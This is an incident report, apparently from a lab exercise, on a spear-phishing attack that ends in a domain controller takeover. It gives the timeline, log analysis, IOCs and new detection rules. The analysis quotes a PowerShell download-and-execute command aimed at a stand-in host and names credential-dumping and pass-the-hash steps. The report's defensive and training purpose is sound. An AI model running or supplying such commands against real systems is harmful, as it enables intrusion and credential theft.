# Incident Report: IR-2026-071 — Spear-Phishing to Domain Controller Takeover
- **Classification**: Lab Exercise (Reducted)
- **Analyst**: Samim Hakimi
- **Date Detected**: 2026-07-10 10:00 (PT)
- **Date Closed**: 2026-07-11
- **Severity**: Critical
- **Status**: Closed
- **MITRE ATT&CK**: T1566.001 Spearphishing Attachment

1. # Executive Summary
A targeted spear-phishing email delivered a malicious attachment that allowed an attacker to gain an initial foothold on a corporate workstation. Within minutes, the attacker moved laterally, harvested credentials, and ultimately obtained full control of a domain controller. The security team detected the domain controller beaconing to a known command-and-control server, launched an immediate investigation, and contained the threat before any data exfiltration was observed. The domain controller was restored from a known-good backup, and all privileged credentials were rotated. Residual risk remains from the potential presence of dormant persistence mechanisms; a full domain-wide audit is underway.

2. # Detection

| Field          | Value                                             |
| -------------- | ------------------------------------------------- |
| Alert Source   | Suricata SID 2801234 (Cobalt Strike HTTPS beacon) |
| Alert Severity | Level 3 — High                                    |
| Detection Time | 2026-07-10 10:00                                  |
| Time to Triage | 12 minutes                                        |
| TheHive Case   | 1742                                              |


A Suricata alert fired for outbound HTTPS traffic from the primary domain controller (DC01) to a known Cobalt Strike C2 IP. The analyst immediately pivoted to Zeek connection logs and confirmed a periodic 60-second beacon interval from DC01, a pattern absent before 09:30 that morning. This led to the discovery of the full attack chain.

3. # Timeline
| Time (PT)  | Event                                                                   |
| ---------- | ----------------------------------------------------------------------- |
| 08:30      | Spear-phishing email delivered to user jdoe@deltacode.io                |
| 09:00      | User opened attachment “Invoice_2026-07.xlsm” and enabled macros        |
| 09:01      | Macro executed PowerShell, downloaded and ran Cobalt Strike beacon      |
| 09:02      | Suricata alert for C2 from workstation WK-JDOE (Tier-2, not escalated)  |
| 09:15      | Beacon operator dumped LSASS memory, harvested NTLM hash of local admin |
| 09:20      | Lateral movement via PsExec to file server FS01 using stolen hash       |
| 09:25      | Credential dumping on FS01 captured domain admin hash                   |
| 09:30      | Pass-the-hash to domain controller DC01; Cobalt Strike beacon deployed  |
| 10:00      | Suricata SID 2801234 fires for DC01 C2 traffic; incident declared       |
| 10:12      | Case IR-2026-071 created in TheHive; triage begins                      |
| 10:30      | DC01 network isolated; compromised domain admin account disabled        |
| 11:45      | All domain admin passwords and KRBTGT reset; DC01 reimaged              |
| 14:00      | Eradication completed across all affected systems                       |
| 2026-07-11 | 48-hour monitoring period closed; no recurrence detected                |

4. # Analysis
Investigation began by correlating the Suricata alert from `DC01` with Zeek `conn.log` logs. Filtering for destination IP `203[.]0[.]113[.]100`, we observed a new connection flow starting at 09:30, exhibiting a consistent 60-second beacon pattern—identical to the Cobalt Strike default sleep time. The user-agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) and the JA3 hash matched known Cobalt Strike malleable profiles.

Pivoting to Sysmon event logs on DC01 (ingested by Wazuh), we found a PowerShell process spawned by the Windows Remote Management (WinRM) service at 09:30. The PowerShell command invoked a reflective DLL loader (Invoke-ReflectivePEInjection) to load the beacon into memory.

Tracing back: Zeek http logs showed that at 09:01, workstation WK-JDOE downloaded a PowerShell script from hxxps://evil.example.com/updater.ps1 after opening a macro-enabled Excel file. The file, Invoice_2026-07.xlsm, was recovered from the user’s Downloads folder. Its SHA256 hash matched a sample previously reported by threat intel (Cortex). The macro executed `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('hxxps://evil.example.com/updater.ps1')"`.

On WK-JDOE, Sysmon event ID 8 (CreateRemoteThread) showed PowerShell injecting into explorer.exe, a common Cobalt Strike technique. A subsequent Sysmon event ID 10 (ProcessAccess) captured lsass.exe access, indicating credential dumping. The NTLM hash of the local administrator account was used at 09:20 for PsExec to FS01 (event ID 4688 with parent services.exe and command line cmd.exe /c ...). On FS01, another LSASS dump yielded a domain admin hash (DOMAIN\svc_backup), which was then used to execute commands on DC01 via WinRM (event ID 4624, logon type 3 with NTLM, followed by event ID 4688 showing PowerShell beacon injection).

Cortex threat intelligence enrichment linked the C2 IP `203[.]0[.]113[.]100` to an APT group known for targeting financial and legal sectors. The payload hash d41d8cd98f00b204e9800998ecf8427e was flagged as Cobalt Strike by VirusTotal with 47/71 detections. No other systems showed indicators of compromise.

5. # Indicators of Compromise (IOCs)
| Type         | Value                                                | Context                                          |
| ------------ | ---------------------------------------------------- | ------------------------------------------------ |
| IP           | 203.0.113.100                                        | C2 server (HTTPS beacon)                         |
| Domain       | [evil.example.com](hxxps://evil.example.com/)        | Staging / payload delivery                       |
| SHA256       | a1b2c3d4e5f6...e7f8a9b0c1d2                          | Malicious XLSM attachment (Invoice_2026-07.xlsm) |
| SHA256       | f3e1c2d5a7b4...0123456789ab                          | Cobalt Strike beacon DLL (stager)                |
| File path    | C:\Users\jdoe\Downloads\Invoice_2026-07.xlsm         | Attachment location                              |
| Registry key | HKCU\Software\Microsoft\Office\16.0\Outlook\Security | Outlook macro policy bypassed                    |

6. # Severity Scoring
**CVSS 3.1 Base Score**: 10.0 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
Domain controller compromise grants an attacker the ability to impersonate any user, decrypt network traffic, and maintain indefinite persistence throughout the entire Active Directory forest. The successful pass-the-hash attack, combined with the deployment of a Cobalt Strike beacon on DC01, meant the attacker held the highest level of privilege. Although no data exfiltration was confirmed, the potential for complete confidentiality, integrity, and availability loss warranted the maximum critical rating.

7. # Response Actions (NIST 800-61)

- **Containment:**
    
    - Network isolation of DC01, FS01, and WK-JDOE at switch level.
    - Disable compromised domain admin account `svc_backup` and all accounts with logon session on affected hosts.
    - Block outbound traffic to C2 IP 203.0.113.100 and domain [evil.example.com](hxxps://evil.example.com/) at perimeter firewall.
        
- **Eradication:**
    
    - Reimage DC01 from a known-good backup taken 48 hours prior.
    - Remove malicious registry run keys and scheduled tasks on FS01 and WK-JDOE; reimage both endpoints.
    - Rotate KRBTGT account password twice.
    - Reset passwords for all domain admins, service accounts, and user jdoe.
    - Delete the downloaded `XLSM` and any PowerShell scripts from user profiles and temp directories.
        
- **Recovery:**
    
    - Restore FS01 from backup after verification.
    - Rejoin WK-JDOE to domain with fresh installation.
    - 72-hour heightened monitoring period using custom Suricata and Wazuh rules; no signs of reinfection.
        

8. # Lessons Learned & Remediation
| #   | Finding                                                                                     | Remediation                                                                                                             |
| --- | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| 1   | Office macros allowed to execute from Internet-originated documents                         | Enforce “Block macros from the Internet” GPO and ASR rule “Block all Office applications from creating child processes” |
| 2   | Highly privileged domain admin account (`svc_backup`) used interactively from a file server | Remove interactive logon rights for service admin accounts; implement tiered administrative model (Tier 0)              |
| 3   | No detection of Cobalt Strike beacon from initial workstation (alert overlooked as Tier-2)  | Upgrade Suricata C2 rules to Tier-1 severity and create automated workflow for beaconing alerts                         |
| 4   | Lack of network segmentation allowed lateral movement from workstation to DC                | Micro-segment DC subnet with IPS restrictions; restrict WinRM and SMB to jump hosts only                                |
| 5   | Pass-the-hash succeeded without MFA or credential guard                                     | Enable Credential Guard on all Tier-0 assets; enforce Kerberos armoring and SMB signing                                 |


9. # Detection Improvements Made
Based on this incident, the following detection logic was created or tuned:

- **Suricata rule** (`/detections/suricata/cobaltstrike_beacon.rules`): Detects HTTPS traffic with known Cobalt Strike JA3 hashes and periodic beacon intervals > 30s. Set to severity Level 3.
    
- **Wazuh rule 100201** (`/detections/wazuh/sysmon_office_spawns_powershell.xml`): Alerts when WinWord or Excel spawn PowerShell with suspicious arguments (`-ep bypass`, `IEX`).
    
- **Wazuh rule 100202** (`/detections/wazuh/lsass_access_non_system.xml`): Alerts on Sysmon Event ID 10 to lsass.exe from unexpected processes (e.g., PowerShell, explorer.exe).
    
- **Zeek notice extension** (`/detections/zeek/beacon_detector.zeek`): Ships a notice when a connection’s inter-arrival time variance falls below a threshold over a 5-minute window.
    
All rules were tested against PCAPs from the incident and added to the production sensor set the same day.